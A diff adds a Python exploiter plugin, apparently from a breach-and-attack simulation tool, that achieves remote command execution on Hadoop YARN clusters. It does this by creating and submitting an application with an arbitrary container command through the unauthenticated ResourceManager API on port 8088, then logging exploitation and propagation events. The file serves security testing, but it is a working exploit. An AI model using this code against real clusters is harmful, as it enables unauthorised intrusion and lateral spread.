+++ monkey/agent_plugins/exploiters/hadoop/src/hadoop.py
@@ -1,0 +1,152 @@
+import json
+import logging
+import posixpath
+import string
+from time import time
+from typing import Any, Dict, Tuple
+from uuid import UUID
+
+import requests
+
+from common.agent_events import ExploitationEvent, PropagationEvent
+from common.common_consts.timeouts import LONG_REQUEST_TIMEOUT
+from common.event_queue import IAgentEventPublisher
+from common.tags import (
+    T1105_ATTACK_TECHNIQUE_TAG,
+    T1203_ATTACK_TECHNIQUE_TAG,
+    T1210_ATTACK_TECHNIQUE_TAG,
+)
+from common.type import Event
+from common.utils.code_utils import insecure_generate_random_string
+from infection_monkey.model import TargetHost
+
+logger = logging.getLogger(__name__)
+HADOOP_EXPLOITER_TAG = "hadoop-exploiter"
+
+
+class Hadoop:
+    _EXPLOITED_SERVICE = "Hadoop"
+    NAME = "HadoopExploiter"
+
+    # Configurable settings
+    HADOOP_PORTS = [("8088", False)]
+    # How long we have our http server open for downloads in seconds
+    DOWNLOAD_TIMEOUT = 60
+    # Random string's length that's used for creating unique app name
+    RAN_STR_LEN = 6
+    # Base name (prefix) of random application name to use in YARN
+    APP_BASE_NAME = "M0NK3Y3XPL0ITABLE"
+
+    _EXPLOITER_TAGS = (HADOOP_EXPLOITER_TAG, T1203_ATTACK_TECHNIQUE_TAG, T1210_ATTACK_TECHNIQUE_TAG)
+    _PROPAGATION_TAGS = (HADOOP_EXPLOITER_TAG, T1105_ATTACK_TECHNIQUE_TAG)
+
+    def __init__(
+        self,
+        host: TargetHost,
+        options: Dict[str, Any],
+        interrupt: Event,
+        agent_id: UUID,
+        agent_event_publisher: IAgentEventPublisher,
+    ):
+        self._host = host
+        self._options = options
+        self._interrupt = interrupt
+        self._agent_id = agent_id
+        self._agent_event_publisher = agent_event_publisher
+
+    def exploit(self, url: str, command: str) -> bool:
+        """
+        A reference to a method which implements web exploit logic.
+
+        :param url: Url to send malicious packet to. Format: [http/https]://ip:port/extension.
+        :param command: Command which will be executed on remote host
+        :return: RCE's output/True if successful or False if failed
+        """
+        if self._interrupt.is_set():
+            return False
+
+        try:
+            # Get the newly created application id
+            timestamp = time()
+            resp = requests.post(
+                posixpath.join(url, "ws/v1/cluster/apps/new-application"),
+                timeout=LONG_REQUEST_TIMEOUT,
+            )
+            resp_dict = json.loads(resp.content)
+            app_id = resp_dict["application-id"]
+
+            # Create a random name for our application in YARN
+            # Avoid the risk of blocking by using insecure_generate_random_string()
+            rand_name = self.APP_BASE_NAME + insecure_generate_random_string(
+                n=self.RAN_STR_LEN, character_set=string.ascii_lowercase
+            )
+            payload = Hadoop._build_payload(app_id, rand_name, command)
+
+            if self._interrupt.is_set():
+                return False
+
+            timestamp = time()
+            resp = requests.post(
+                posixpath.join(url, "ws/v1/cluster/apps/"),
+                json=payload,
+                timeout=LONG_REQUEST_TIMEOUT,
+            )
+
+            success = resp.status_code == 202
+        except requests.ConnectionError:
+            success = False
+
+        message = "" if success else f"Failed to exploit via {url}"
+        self._publish_exploitation_event(timestamp, success, error_message=message)
+        self._publish_propagation_event(timestamp, success, error_message=message)
+        return success
+
+    @staticmethod
+    def _build_payload(app_id, name, command):
+        payload = {
+            "application-id": app_id,
+            "application-name": name,
+            "am-container-spec": {
+                "commands": {
+                    "command": command,
+                }
+            },
+            "application-type": "YARN",
+        }
+        return payload
+
+    def _publish_exploitation_event(
+        self,
+        time: float = time(),
+        success: bool = False,
+        tags: Tuple[str, ...] = tuple(),
+        error_message: str = "",
+    ):
+        exploitation_event = ExploitationEvent(
+            source=self._agent_id,
+            target=self._host.ip,
+            success=success,
+            exploiter_name=self.NAME,
+            error_message=error_message,
+            timestamp=time,
+            tags=frozenset(tags or self._EXPLOITER_TAGS),
+        )
+        self._agent_event_publisher.publish(exploitation_event)
+
+    def _publish_propagation_event(
+        self,
+        time: float = time(),
+        success: bool = False,
+        tags: Tuple[str, ...] = tuple(),
+        error_message: str = "",
+    ):
+        propagation_event = PropagationEvent(
+            source=self._agent_id,
+            target=self._host.ip,
+            success=success,
+            exploiter_name=self.NAME,
+            error_message=error_message,
+            timestamp=time,
+            tags=frozenset(tags or self._PROPAGATION_TAGS),
+        )
+        self._agent_event_publisher.publish(propagation_event)
